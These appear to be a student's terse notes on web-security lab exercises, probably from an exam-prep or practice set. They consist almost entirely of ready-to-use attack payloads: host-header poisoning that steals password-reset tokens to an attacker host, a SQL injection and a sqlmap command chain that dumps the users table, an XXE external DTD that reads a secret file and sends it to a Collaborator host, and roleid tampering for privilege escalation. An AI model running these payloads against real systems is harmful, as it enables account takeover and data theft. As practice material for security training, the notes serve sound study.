# extra 2  

## 1 - 1  

>Forgot password?

>host headers  

```
X-Host: EXPLOIT.com
X-Forwarded-Server: EXPLOIT.com
X-Forwarded-For: EXPLOIT.com
```  

>log  

```
/forgot_password?temp-forgot-password-token=y0x5HxxbQGl6EGL5L11e8jrvRqjO4qQ5
```

## 1 - 2  

>Advanced search

>SQL: Injection with SQLMAP exploit 

```
/filteredsearch?lookup='+UNION+SELECT+'abc'+--&organizeby=DATE&journalist=
```



>SQLMAP  
 
```
https://TARGET.NET/filteredsearch?lookup=x&organizeby=DATE&journalist=x
```  

```
sqlmap -v -u 'https://TARGET.NET/filteredsearch?lookup=x&organizeby=DATE&journalist=&cachebust=1656138093.57' -p "lookup" --batch --cookie="_lab=46%7cMCwCFDvhZu3NmSkocq341QWncV743o7oAhRVy%2fBaZXa0G7T6taADrF%2foqS%2fSemjTgckosrUOYPxEqcygpvHC2AHJ0Zg6KirfotNJLfF96pLnZGYaMu9XcednYxBwRrWf9w%2b7uOJ90fvpY4AT5dK6OnDFj9SOtZ1364YhnCOB11mk0qY%3d; session=6lgfjR7dN8rxS1W1zEAPFipLLdI7FB5G" --random-agent --level=2 --risk=2
```  

```
sqlmap -v -u 'https://TARGET.NET/filteredsearch?lookup=x&organizeby=DATE&journalist=&cachebust=1656138093.57' -p "lookup" --batch --cookie="_lab=46%7cMCwCFDvhZu3NmSkocq341QWncV743o7oAhRVy%2fBaZXa0G7T6taADrF%2foqS%2fSemjTgckosrUOYPxEqcygpvHC2AHJ0Zg6KirfotNJLfF96pLnZGYaMu9XcednYxBwRrWf9w%2b7uOJ90fvpY4AT5dK6OnDFj9SOtZ1364YhnCOB11mk0qY%3d; session=6lgfjR7dN8rxS1W1zEAPFipLLdI7FB5G" --random-agent --level=2 --risk=2 --dbms=PostgreSQL
```  

```
sqlmap -v -u 'https://TARGET.NET/filteredsearch?lookup=x&organizeby=DATE&journalist=&cachebust=1656138093.57' -p "lookup" --batch --cookie="_lab=46%7cMCwCFDvhZu3NmSkocq341QWncV743o7oAhRVy%2fBaZXa0G7T6taADrF%2foqS%2fSemjTgckosrUOYPxEqcygpvHC2AHJ0Zg6KirfotNJLfF96pLnZGYaMu9XcednYxBwRrWf9w%2b7uOJ90fvpY4AT5dK6OnDFj9SOtZ1364YhnCOB11mk0qY%3d; session=6lgfjR7dN8rxS1W1zEAPFipLLdI7FB5G" --random-agent --level=2 --risk=2 --dbms=PostgreSQL --dbs
```  

```
sqlmap -v -u 'https://TARGET.NET/filteredsearch?lookup=x&organizeby=DATE&journalist=&cachebust=1656138093.57' -p "lookup" --batch --cookie="_lab=46%7cMCwCFDvhZu3NmSkocq341QWncV743o7oAhRVy%2fBaZXa0G7T6taADrF%2foqS%2fSemjTgckosrUOYPxEqcygpvHC2AHJ0Zg6KirfotNJLfF96pLnZGYaMu9XcednYxBwRrWf9w%2b7uOJ90fvpY4AT5dK6OnDFj9SOtZ1364YhnCOB11mk0qY%3d; session=6lgfjR7dN8rxS1W1zEAPFipLLdI7FB5G" --random-agent --level=2 --risk=2 --dbms=PostgreSQL -D public --tables
```  

```
sqlmap -v -u 'https://TARGET.NET/filteredsearch?lookup=x&organizeby=DATE&journalist=&cachebust=1656138093.57' -p "lookup" --batch --cookie="_lab=46%7cMCwCFDvhZu3NmSkocq341QWncV743o7oAhRVy%2fBaZXa0G7T6taADrF%2foqS%2fSemjTgckosrUOYPxEqcygpvHC2AHJ0Zg6KirfotNJLfF96pLnZGYaMu9XcednYxBwRrWf9w%2b7uOJ90fvpY4AT5dK6OnDFj9SOtZ1364YhnCOB11mk0qY%3d; session=6lgfjR7dN8rxS1W1zEAPFipLLdI7FB5G" --random-agent --level=2 --risk=2 --dbms=PostgreSQL -D public -T users --dump
```  

## 1 - 3  

>XXE add users  

>SERVER exploit.dtd  
  
```
<!ENTITY % file SYSTEM "file:///home/carlos/secret">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://COLLABORATOR.com/?x=%file;'>">
%eval;
%exfil;
```  

>XML File Upload user_import  


```
<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE users [<!ENTITY % xxe SYSTEM "https://exploit-0aaa001b0439377fc0746bbe014200d6.web-security-academy.net/exploit.dtd"> %xxe;]>
<users>
    <user>
        <username>3421xxe3421</username>
        <email>14@23xxe</email>
    </user>    
</users>
```  

>Internal Server Error - XML parsing error - Ignore message response and check the Burp Collaboration Server HTTP
					
## 2 - 1  

>Forgot password?  

```
X-Forwarded-Host: b4g0j1ujjvziwcbt050afzkqhhnab1zu0iq5gt5.oastify.com
X-Host: b4g0j1ujjvziwcbt050afzkqhhnab1zu0iq5gt5.oastify.com
X-Forwarded-Server: b4g0j1ujjvziwcbt050afzkqhhnab1zu0iq5gt5.oastify.com
```  

>EXPLOIt SERVER LOGS  

```
/new_password?temp-forgot-password-token=DZX6O8ra9emPGW8pet9msLaJSceXinFt
```


## 2 - 2  

>update email  

>ACCESS CONTROL  roleID: 42  

>INTRUDER run through roleID value numbers

```
{
	"csrf":"LfjLSEtL7kWqaJN6nYJ14GStmeMQUz3T",
	"email":"Carlos@app2.test7",
	"roleid": 42
}
```  

## 2 -3  


>FILE Upload XML

>XML parsing error  
